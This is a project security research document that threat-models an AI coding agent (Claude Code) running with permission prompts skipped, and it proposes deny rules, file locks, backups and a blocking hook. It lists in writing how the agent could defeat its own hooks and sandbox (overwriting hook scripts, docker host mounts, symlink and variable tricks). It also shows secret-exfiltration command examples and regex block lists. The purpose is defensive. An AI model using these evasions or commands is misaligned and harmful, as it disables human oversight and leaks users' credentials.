# Safety Running Without Permission Research

## Problem Statement
I want safeguards so when I run in --dangerously-skip-permissions, nothing is permanently lost and I have Github backup and settings are not changed.

## Requirements (from GH Issue #593)
- Safeguards when running Claude Code with --dangerously-skip-permissions
- Nothing is permanently lost (code, files, data)
- GitHub backup exists before dangerous operations
- Settings files are not changed by Claude Code in skip-permissions mode

## High Level Summary

The `--dangerously-skip-permissions` flag disables all permission **prompts** but does NOT disable:
1. **Deny rules** — still evaluated and enforced before tool execution
2. **Hooks** — PreToolUse/PostToolUse/SessionStart/SessionEnd all still execute
3. **Sandbox** — OS-level filesystem and network isolation still enforced (bubblewrap on Linux)
4. **GitHub rulesets** — server-side protections cannot be bypassed locally

The current configuration has **strong protection** for settings files (via sandbox denyWithinAllow) and main/production branches (via GitHub rulesets), but has **18 identified threat vectors** across file modification, data loss, data exfiltration, hook bypass, and settings tampering categories — including 5 CRITICAL threats.

The root cause of most vulnerabilities is **overly broad wildcard allow rules** in `settings.json` (root level). Commands like `Bash(sed:*)`, `Bash(tee:*)`, `Bash(cat:*)`, `Bash(echo:*)`, `Bash(git push:*)`, and `Bash(gh issue create:*)` auto-approve destructive operations that bypass all hook-based protections.

### What Changes with --dangerously-skip-permissions
- "Ask" rules become auto-approved
- No prompts for any tool use (bash, edit, write, MCP, etc.)
- Claude can freely execute commands within sandbox boundaries
- Deny rules, hooks, and sandbox continue to enforce
- Commands NOT in deny or allow list are auto-approved (whereas normally they'd prompt)

## System Information

- **Claude Code Version**: 2.1.63 (patched against CVE-2025-59536 and CVE-2026-21852)
- **Sandbox**: bubblewrap 0.9.0 with unprivileged user namespaces enabled
- **AppArmor**: Active (no Claude-specific profiles)
- **SELinux**: Not installed
- **chattr**: Available for immutable file flags
- **Managed settings**: NOT configured (/etc/claude-code/managed-settings.json does not exist)

## Documents Read

### Core Docs
- docs/docs_overall/getting_started.md — documentation structure
- docs/docs_overall/architecture.md — system design, 60k+ LOC TypeScript
- docs/docs_overall/project_workflow.md — workflow enforcement

### Claude Code Official Docs (3 rounds)
- --dangerously-skip-permissions behavior and risk analysis
- Permission modes: default, acceptEdits, plan, dontAsk, bypassPermissions
- Sandbox architecture: OS-level (bubblewrap on Linux), independent of permissions
- Managed settings: highest precedence, non-overridable, supports `disableBypassPermissionsMode`
- Hook execution: runs regardless of permission mode
- Deny rule pattern matching: known bugs with path normalization (Issues #18200, #11662, #15499)
- CVE-2025-59536 (Hooks RCE, CVSS 8.7, fixed v1.0.111)
- CVE-2026-21852 (MCP consent bypass, CVSS 5.3, fixed v2.0.65)
- CVE-2026-24052 (Domain validation bypass)
- CVE-2025-55284 (DNS exfiltration)

## Code Files Read

### Settings Files
- `.claude/settings.json` (215 lines) — project-level deny/ask/allow rules, sandbox config, hooks
- `.claude/settings.local.json` (8 lines) — local extensions for Google Fonts
- `settings.json` (182 lines) — root-level allow/deny rules, extensive bash allow list, plugins
- `~/.claude/settings.json` — user-level: `skipDangerousModePermissionPrompt: true`

### Hook Scripts (9 files in .claude/hooks/)
- `block-manual-server.sh` — prevents direct dev server starts
- `block-silent-failures.sh` — blocks empty catch blocks in TS/JS
- `block-supabase-writes.sh` — blocks direct DB mutations
- `check-test-patterns.sh` — warns about bad test patterns (non-blocking)
- `check-workflow-ready.sh` — enforces doc reading and todo creation before code edits
- `track-prerequisites.sh` — tracks prerequisite completion in _status.json
- `fresh-branch-on-startup.sh` — creates session branch from main on startup
- `start-dev-servers.sh` — cleans stale tmux sessions (doesn't start servers)
- `cleanup-tmux.sh` — kills tmux sessions on exit

### Other Config
- `.gitignore` — protects .env*, *.pem, .claude/review-state/, .claude/agents
- `.githooks/pre-commit` — only checks migration timestamps, no secret scanning
- `reset_worktrees` — destructive script that's in the allow list, copies .env.local to 5 worktrees
- `CLAUDE_global_backup.md` — git-tracked file containing email + password (historical)
- No `/etc/claude-code/managed-settings.json` exists

---

## Key Findings

### 1. GitHub Branch Rulesets — STRONG

**Main branch ruleset (active, no bypass actors):**
- Deletion blocked, non-fast-forward blocked, PR required, "Lint" CI required, linear history required
- `current_user_can_bypass: "never"`

**Production branch ruleset (active, no bypass actors):**
- Deletion blocked, non-fast-forward blocked, PR required, "Lint" CI required
- `current_user_can_bypass: "never"`

**Result:** Claude CANNOT force-push to main/production or delete them, even with skip-permissions.

### 2. Settings File Protection — MOSTLY PROTECTED VIA SANDBOX

**Sandbox `denyWithinAllow` (OS-level, works even with skip-permissions):**
- `.claude/settings.json` — PROTECTED
- `.claude/settings.local.json` — PROTECTED (+ mode 444 + deny rule)
- `~/.claude/settings.json` — PROTECTED (+ deny rule)
- `/etc/claude-code/managed-settings.json` — PROTECTED
- `.claude/skills` — PROTECTED
- Git internals (HEAD, objects, refs, hooks, config) — PROTECTED

**NOT protected by sandbox denyWithinAllow:**

| File | Disk Mode | Protection | Skip-Permissions Behavior |
|------|-----------|-----------|---------------------------|
| `settings.json` (root) | 644 | None | **CAN BE MODIFIED** |
| `CLAUDE.md` | 644 | None | **CAN BE MODIFIED** |
| `.claude/hooks/*.sh` | 755 | None | **CAN BE MODIFIED** |
| `.claude/doc-mapping.json` | writable | None | **CAN BE MODIFIED** |
| `.claude/commands/**` | writable | None | **CAN BE MODIFIED** |

### 3. Destructive Git Operations — PARTIALLY PROTECTED

| Operation | Protection | Risk |
|-----------|-----------|------|
| `git push --force` to main | GitHub ruleset blocks | LOW |
| `git push --force` to feature branch | **None** (allow rule matches) | **HIGH** |
| `git reset --hard` | **None** | **HIGH** |
| `git checkout -- .` | **None** (allow rule matches) | **HIGH** |
| `git clean -fd` | **None** | **HIGH** |
| `git stash drop/clear` | **None** (allow rule matches) | **MEDIUM** |

### 4. Sandbox Configuration Gaps

```json
{
  "excludedCommands": ["git", "gh", "docker", "tmux"]
}
```

**Critical:** `git`, `gh`, `docker`, `tmux` bypass sandbox entirely — no filesystem or network restrictions.

### 5. Allow List Wildcard Audit — CRITICAL GAPS

**Commands auto-approved that enable file writes to ANY path:**

| Allow Rule | Dangerous Use | Risk |
|-----------|--------------|------|
| `Bash(sed:*)` | `sed -i 's/old/new/' CLAUDE.md` | CRITICAL |
| `Bash(tee:*)` | `echo x \| tee .claude/hooks/hook.sh` | CRITICAL |
| `Bash(cat:*)` | `cat > CLAUDE.md <<EOF` | CRITICAL |
| `Bash(echo:*)` | `echo "" > .claude/hooks/hook.sh` | CRITICAL |
| `Bash(mv:*)` | `mv .claude/hooks/hook.sh /tmp/` | HIGH |

**Commands auto-approved that enable destructive git operations:**

| Allow Rule | Dangerous Use | Risk |
|-----------|--------------|------|
| `Bash(git push:*)` | `git push --force origin branch` | HIGH |
| `Bash(git checkout:*)` | `git checkout -- .` (discard all changes) | HIGH |
| `Bash(git stash:*)` | `git stash clear` (destroy all stashes) | MEDIUM |
| `Bash(git rebase:*)` | `git rebase --root` (rewrite all history) | HIGH |

**Commands auto-approved that enable data exfiltration:**

| Allow Rule | Dangerous Use | Risk |
|-----------|--------------|------|
| `Bash(gh issue create:*)` | `gh issue create --body "$(cat .env.local)"` | CRITICAL |
| `Bash(find:*)` | `find / -name "*.env" -exec cat {} \;` | HIGH |
| `Bash(cat:*)` | `cat ~/.ssh/id_rsa` | HIGH |

**Commands that bypass other restrictions:**

| Allow Rule | Dangerous Use | Risk |
|-----------|--------------|------|
| `Bash(timeout:*)` | `timeout 999 <any-denied-command>` | HIGH |

### 6. Hook Bypass Analysis — SYSTEMIC VULNERABILITIES

**Critical finding: All hooks are self-destructible.** Since `.claude/hooks/` is unprotected and `Bash(echo:*)` is auto-approved, Claude can neutralize any hook:
```bash
echo '#!/bin/bash\nexit 0' > .claude/hooks/block-supabase-writes.sh
```

**Other bypass vectors:**
- `fix/` branch prefix bypasses workflow enforcement
- Detached HEAD bypasses workflow enforcement
- `_status.json` can be forged via Bash redirect
- `sed -i` modifies files without triggering Edit/Write hooks
- Variable indirection (`F="CLAUDE.md"; echo > "$F"`) defeats string matching
- Symlink attacks bypass path-based hook checks
- `git apply crafted.patch` modifies any file (git excluded from sandbox)

### 7. Deny Rule Pattern Matching — KNOWN BUGS

- **Issue #18200**: Relative Edit/Write patterns don't match absolute paths
- **Issue #11662**: Bash deny rules may only block relative paths
- **Issue #15499**: `~` paths don't match when converted to relative
- Shell operators `&&`, `||` ARE understood (safe)
- Deny always wins over allow regardless of settings scope

### 8. CVE Status — ALL PATCHED

Running version 2.1.63 (February 2026):
- CVE-2025-59536 (Hooks RCE) — fixed in v1.0.111 ✓
- CVE-2026-21852 (MCP bypass) — fixed in v2.0.65 ✓
- CVE-2026-24052 (Domain validation) — fixed ✓
- CVE-2025-55284 (DNS exfil) — fixed ✓

### 9. Credentials in Git History

- `CLAUDE_global_backup.md` is git-tracked and contains email + password
- `.env.local` exists on disk with production API keys (correctly gitignored)
- `reset_worktrees` script copies `.env.local` to 5 worktree directories (multiplies attack surface)
- No secret scanning in pre-commit hook

---

## Complete Threat Model

### CRITICAL Threats

| ID | Category | Attack Vector | Current Protection | Fix |
|----|----------|--------------|-------------------|-----|
| T1 | File Modification | `cat > CLAUDE.md` | None | Deny rule + chmod 444 + hook |
| T2 | Hook Bypass | `echo "" > .claude/hooks/*.sh` | None | Deny rule + chmod 444 + sandbox entry |
| T3 | Settings Tampering | `sed -i settings.json` | None | Deny rule + chmod 444 + remove sed allow |
| T7 | Data Exfiltration | `gh issue create --body "$(cat .env.local)"` | None | Remove gh issue create allow + hook |
| T17 | Full Sandbox Escape | `docker run -v /:/host alpine sh` | None | Deny all docker commands |

### HIGH Threats

| ID | Category | Attack Vector | Current Protection | Fix |
|----|----------|--------------|-------------------|-----|
| T4 | Data Loss | `git push --force` (feature branch) | GitHub ruleset (main only) | Deny rule on force flags |
| T5 | Data Loss | `git checkout -- .` | None | Deny or split checkout allow |
| T6 | Data Loss | `rm -rf src/` | Sandbox (within workdir) | Deny rule + SessionStart push |
| T8 | File Modification | `chmod 777` then overwrite | None | Deny chmod |
| T10 | Settings Tampering | `echo > _status.json` | None | Deny _status.json writes |
| T13 | File Modification | `git apply crafted.patch` | None | Deny git apply |
| T14 | Data Loss | `git reset --hard HEAD~5` | None | Deny rule + SessionStart push |
| T16 | File Modification | MCP filesystem write tool | Write variants not allowed yet | Proactively deny |
| T18 | Hook Bypass | `npm run` calling denied tools | Child process inherits allow | Scope npm run allows |

### MEDIUM Threats

| ID | Category | Attack Vector | Current Protection | Fix |
|----|----------|--------------|-------------------|-----|
| T9 | Hook Bypass | `git checkout -b fix/anything` | Documented bypass | Remove prefix bypass |
| T11 | File Modification | Symlink attack | chmod 444 (if applied) | Deny ln + chmod |
| T12 | File Modification | Variable indirection `F="X"; echo > "$F"` | None (hook defeats) | OS-level chmod only defense |
| T15 | Data Loss | `git stash drop` | None | Split stash allow rule |

---

## Recommended Safeguards (Priority Order)

### Priority 1: Add Deny Rules in `.claude/settings.json`

```json
"deny": [
  "Edit(CLAUDE.md)",
  "Write(CLAUDE.md)",
  "Edit(.claude/hooks/**)",
  "Write(.claude/hooks/**)",
  "Edit(.claude/doc-mapping.json)",
  "Write(.claude/doc-mapping.json)",
  "Edit(.claude/commands/**)",
  "Write(.claude/commands/**)",
  "Edit(settings.json)",
  "Write(settings.json)",
  "Bash(git push --force:*)",
  "Bash(git push --force-with-lease:*)",
  "Bash(git push -f:*)",
  "Bash(git reset --hard:*)",
  "Bash(git branch -D:*)",
  "Bash(git clean -f:*)",
  "Bash(git checkout -- .:*)",
  "Bash(git restore -- .:*)",
  "Bash(git apply:*)",
  "Bash(git stash drop:*)",
  "Bash(git stash clear:*)",
  "Bash(rm -rf:*)",
  "Bash(chmod:*)",
  "Bash(chown:*)",
  "Bash(ln -s:*)",
  "Bash(docker run:*)",
  "Bash(docker exec:*)",
  "Bash(docker-compose:*)"
]
```

### Priority 2: Tighten Allow Rules in `settings.json` (root)

| Current | Replace With |
|---------|-------------|
| `Bash(sed:*)` | REMOVE (use Edit tool) |
| `Bash(tee:*)` | REMOVE (use Write tool) |
| `Bash(mv:*)` | REMOVE or scope to `Bash(mv ./src/:*)` |
| `Bash(cat:*)` | Scope to `Bash(cat ./:*)` or rely on Read tool |
| `Bash(find:*)` | `Bash(find .:*)` |
| `Bash(git push:*)` | `Bash(git push origin HEAD:*)` |
| `Bash(git checkout:*)` | `Bash(git checkout -b:*)` + `Bash(git checkout -t:*)` |
| `Bash(git stash:*)` | `Bash(git stash push:*)` + `Bash(git stash pop:*)` + `Bash(git stash list:*)` |
| `Bash(git rebase:*)` | `Bash(git rebase origin/:*)` |
| `Bash(git commit:*)` | `Bash(git commit -m:*)` |
| `Bash(timeout:*)` | `Bash(timeout 60 npx playwright:*)` + `Bash(timeout 30 npm:*)` |
| `Bash(kill:*)` + `Bash(pkill:*)` + `Bash(xargs kill:*)` | Scope to specific processes |
| `Bash(gh issue create:*)` | Move to ask rule or remove |

### Priority 3: Make Critical Files Read-Only (defense-in-depth)

```bash
chmod 444 CLAUDE.md settings.json .claude/doc-mapping.json .claude/hooks/*.sh
chmod 555 .claude/hooks .claude/commands
# For immutable protection (strongest):
sudo chattr +i CLAUDE.md settings.json .claude/hooks/*.sh
```

### Priority 4: Add SessionStart Backup Hook

Create `.claude/hooks/backup-session-state.sh` that:
- Pushes current branch to remote before any session activity
- Creates a timestamped git tag marking pre-session state
- Logs to `.claude/logs/backup-audit.log` for audit trail
- Never blocks session start (exits 0 on all failure paths)
- Fires before `fresh-branch-on-startup.sh` (first in SessionStart array)

### Priority 5: Add PreToolUse File Protection Hook

Create `.claude/hooks/block-critical-file-writes.sh` that:
- Matches on `Bash` tool
- Pattern-matches commands for file-write operations targeting protected paths
- Covers: redirect operators, tee, sed -i, cp, mv, dd, rm, chmod, git checkout --, truncate
- Protected paths: CLAUDE.md, .claude/hooks/, .claude/doc-mapping.json, .claude/commands/, settings.json, .env*, .githooks/

### Priority 6: Remove `skipDangerousModePermissionPrompt`

Remove from `~/.claude/settings.json`:
```json
"skipDangerousModePermissionPrompt": true
```

### Priority 7: Create Managed Settings

Create `/etc/claude-code/managed-settings.json`:
```json
{
  "permissions": {
    "deny": [
      "Bash(docker run:*)",
      "Bash(docker exec:*)",
      "Bash(git push --force:*)",
      "Bash(git reset --hard:*)",
      "Bash(chmod:*)"
    ]
  },
  "sandbox": {
    "enabled": true,
    "allowUnsandboxedCommands": false
  }
}
```

### Priority 8: Additional Git Safety

- Add `Bash(git add -A:*)` and `Bash(git add .:*)` to deny list
- Add `Bash(git commit --amend:*)` to deny list
- Remove `CLAUDE_global_backup.md` from git tracking (contains credentials)
- Add secret scanning to `.githooks/pre-commit`

---

---

## Conditional Mitigation: Bypass-Mode-Only Enforcement

### Key Discovery: `permission_mode` in Hook JSON

All hooks (SessionStart, PreToolUse, PostToolUse) receive a `permission_mode` field in their stdin JSON:

```json
{
  "session_id": "abc123",
  "cwd": "/home/ac/Documents/ac/worktree_37_1",
  "permission_mode": "bypassPermissions",
  "tool_name": "Bash",
  "tool_input": { "command": "..." }
}
```

**Values:**
- `"default"` — standard interactive mode
- `"plan"` — read-only plan mode
- `"acceptEdits"` — auto-accepts edits, prompts for commands
- `"dontAsk"` — auto-denies unless pre-approved
- `"bypassPermissions"` — `--dangerously-skip-permissions` active

This means hooks can **conditionally enforce** extra restrictions only when running in bypass mode, adding zero friction to normal interactive use.

### Alternative Detection: Environment Variable Inheritance

Environment variables from the parent shell propagate through Claude Code to hook child processes (proven by existing `WORKFLOW_BYPASS=true` pattern in `check-workflow-ready.sh`). This enables a wrapper approach:

```bash
alias claude-unsafe='CLAUDE_UNSAFE=true claude --dangerously-skip-permissions'
```

However, the `permission_mode` JSON field is superior because:
- Works automatically without wrapper scripts
- Detects `defaultMode: "bypassPermissions"` in settings too
- Official documented API, not implementation detail

### Implementation Strategy: Single Conditional Safety Hook

Create one PreToolUse hook that reads `permission_mode` from stdin and applies extra enforcement only when in bypass mode. In normal mode, it exits immediately (zero overhead).

**Architecture:**

```
Normal mode:   PreToolUse → check permission_mode → "default" → exit 0 (no-op)
Bypass mode:   PreToolUse → check permission_mode → "bypassPermissions" → enforce extra rules
```

**What the bypass-mode hook enforces (things that would normally be prompted but are now auto-approved):**

| Category | Blocked Commands | Why |
|----------|-----------------|-----|
| File writes | `sed -i`, `tee`, `cat >`, `echo >`, `cp`, `mv` targeting protected files | These are in the allow list and would be auto-approved |
| Destructive git | `git push --force`, `git reset --hard`, `git checkout -- .`, `git clean` | These are in the allow list and bypass sandbox |
| Data exfil | `gh issue create --body "$(..."`, `gh gist create` | Command substitution can embed secrets |
| Hook self-modification | Any write to `.claude/hooks/`, `CLAUDE.md`, `settings.json` | Disabling safety controls |
| Docker escape | `docker run -v`, `docker exec` | Full sandbox escape |
| Process kill | `kill -9 -1`, `pkill -f ".*"` | Broad process disruption |

**What it does NOT block (even in bypass mode):**
- Normal `git push origin HEAD` (non-force)
- `npm run lint`, `npm run build`, `npm run test`
- File reads (Read tool, `cat` without redirect)
- `git add`, `git commit -m`
- All hooks, sandbox, and deny rules continue as before

### Hook Script Design

```bash
#!/bin/bash
# .claude/hooks/enforce-bypass-safety.sh
# Conditional safety enforcer: only active in --dangerously-skip-permissions mode.
# In normal interactive mode, exits immediately with no overhead.

INPUT=$(cat)
PERMISSION_MODE=$(echo "$INPUT" | jq -r '.permission_mode // empty')

# Fast path: do nothing in normal mode
if [ "$PERMISSION_MODE" != "bypassPermissions" ]; then
  exit 0
fi

TOOL_NAME=$(echo "$INPUT" | jq -r '.tool_name // empty')

# Only inspect Bash commands (Edit/Write have separate deny rules)
if [ "$TOOL_NAME" != "Bash" ]; then
  exit 0
fi

COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

# --- Protected file patterns ---
PROTECTED_FILES="CLAUDE\\.md|settings\\.json|\\.claude/hooks/|\\.claude/doc-mapping|\\.claude/commands/|\\.env"

# --- Destructive patterns to block ---
# File writes to protected paths
if echo "$COMMAND" | grep -qE "(>|tee|sed -i|cp |mv |dd |chmod |chown |truncate |rm ).*($PROTECTED_FILES)"; then
  # Output deny decision
  echo '{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"[BYPASS SAFETY] Blocked: write to protected file in skip-permissions mode"}}'
  exit 0
fi

# Force push (any variant)
if echo "$COMMAND" | grep -qE "git push.*(--force|--force-with-lease|-f )|git push [^ ]+ \+"; then
  echo '{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"[BYPASS SAFETY] Blocked: force push in skip-permissions mode"}}'
  exit 0
fi

# Destructive git operations
if echo "$COMMAND" | grep -qE "git (reset --hard|clean -f|checkout -- \.|restore -- \.|stash (drop|clear))"; then
  echo '{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"[BYPASS SAFETY] Blocked: destructive git operation in skip-permissions mode"}}'
  exit 0
fi

# Docker escape
if echo "$COMMAND" | grep -qE "docker (run|exec|compose)"; then
  echo '{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"[BYPASS SAFETY] Blocked: docker command in skip-permissions mode"}}'
  exit 0
fi

# Data exfiltration via gh
if echo "$COMMAND" | grep -qE "gh (gist create|issue create.*\\$\\()"; then
  echo '{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"[BYPASS SAFETY] Blocked: potential data exfiltration in skip-permissions mode"}}'
  exit 0
fi

# Mass process kill
if echo "$COMMAND" | grep -qE "(kill -[0-9]+ -1|pkill -f \"\\.\\*\")"; then
  echo '{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"[BYPASS SAFETY] Blocked: mass process kill in skip-permissions mode"}}'
  exit 0
fi

# rm -rf on project directories
if echo "$COMMAND" | grep -qE "rm -rf (src|docs|\.claude|\.git|node_modules)"; then
  echo '{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"[BYPASS SAFETY] Blocked: recursive delete of project directory in skip-permissions mode"}}'
  exit 0
fi

exit 0
```

### SessionStart Backup Hook (Bypass-Mode Only)

The backup hook also benefits from conditional activation:

```bash
#!/bin/bash
# .claude/hooks/backup-on-bypass.sh
# Only pushes to remote when starting in bypass permissions mode.
# In normal mode, the user can manually push when they choose.

INPUT=$(cat)
PERMISSION_MODE=$(echo "$INPUT" | jq -r '.permission_mode // empty')
CWD=$(echo "$INPUT" | jq -r '.cwd // empty')

# Only activate in bypass mode
if [ "$PERMISSION_MODE" != "bypassPermissions" ]; then
  exit 0
fi

cd "$CWD" || exit 0
BRANCH=$(git branch --show-current 2>/dev/null)
[ -z "$BRANCH" ] && exit 0
[[ "$BRANCH" == "main" || "$BRANCH" == "master" ]] && exit 0

# Push to remote for backup
REMOTE=$(git remote | head -1)
[ -z "$REMOTE" ] && exit 0

timeout 15s git push "$REMOTE" "$BRANCH" 2>/dev/null || true

# Tag the pre-session state
TAG="backup/pre-bypass-$(date -u +%Y%m%dT%H%M%SZ)"
git tag "$TAG" HEAD 2>/dev/null
timeout 10s git push "$REMOTE" "$TAG" 2>/dev/null || true

echo "[BYPASS SAFETY] Backed up $BRANCH to $REMOTE and tagged $TAG" >&2
exit 0
```

### Settings Changes to Wire Up Conditional Hooks

Add to `.claude/settings.json`:

```json
"SessionStart": [
  {
    "hooks": [
      { "type": "command", "command": "bash .claude/hooks/backup-on-bypass.sh" }
    ]
  },
  // ... existing SessionStart hooks ...
],
"PreToolUse": [
  {
    "matcher": "Bash",
    "hooks": [
      { "type": "command", "command": "bash .claude/hooks/enforce-bypass-safety.sh" },
      // ... existing Bash hooks ...
    ]
  },
  // ... existing Edit/Write hooks ...
]
```

### What This Approach Does NOT Cover

Even with conditional hooks, some vectors remain unmitigable at the hook level:

1. **Variable indirection**: `F="CLAUDE.md"; echo > "$F"` — hook string matching can't evaluate shell variables
2. **Symlink attacks**: `ln -s CLAUDE.md /tmp/x && echo > /tmp/x` — path doesn't match protected pattern
3. **git apply**: Patch content isn't visible in the command string
4. **npm script injection**: Child processes of allowed npm commands can run anything
5. **Subshell escapes**: `$(echo "rm -rf src")` — nested command substitution

These require OS-level defenses (chmod 444, chattr +i) which should be applied regardless of mode.

### Comparison: Always-On vs Conditional Mitigations

| Mitigation | Always-On? | Bypass-Mode Only? | Rationale |
|-----------|-----------|-------------------|-----------|
| Deny rules in `.claude/settings.json` | ✓ | | Deny rules don't cause friction (silently block) |
| chmod 444 on critical files | ✓ | | No UX impact |
| chattr +i on critical files | ✓ | | No UX impact |
| SessionStart backup push | | ✓ | Avoid push noise in normal mode |
| PreToolUse command blocking | | ✓ | Avoid false positives blocking legitimate prompted commands |
| Tightened allow list in settings.json | ✓ | | Tighter allows improve security in all modes |

**Recommended split:**
- **Always-on**: Deny rules, chmod/chattr, tightened allow list (no user impact)
- **Bypass-mode only**: Backup push, aggressive command pattern blocking (avoids friction)

## Open Questions

1. Should the backup push happen on SessionStart or as a PreToolUse hook on every destructive command? → **Recommended: SessionStart** (simpler, covers all cases)
2. Should deny rules be added to `settings.json` (root) as well for double protection? → **Yes**, but `.claude/settings.json` denies take precedence
3. Should `docker` be removed from `excludedCommands`? → **Yes** unless Docker is actively needed for development
4. Should `fix/` branch prefix bypass be removed from `check-workflow-ready.sh`? → **Consider it** — use env var bypass only
5. Should `npm run:*` be scoped to specific scripts? → **Yes** — `npm run lint:*`, `npm run build:*`, `npm run test:*`, etc.
6. Should `chattr +i` be applied to critical files? → **Yes** for maximum protection, but requires sudo
7. Does the `permission_mode` field actually exist in the current Claude Code version (2.1.63)? → Needs testing on first use
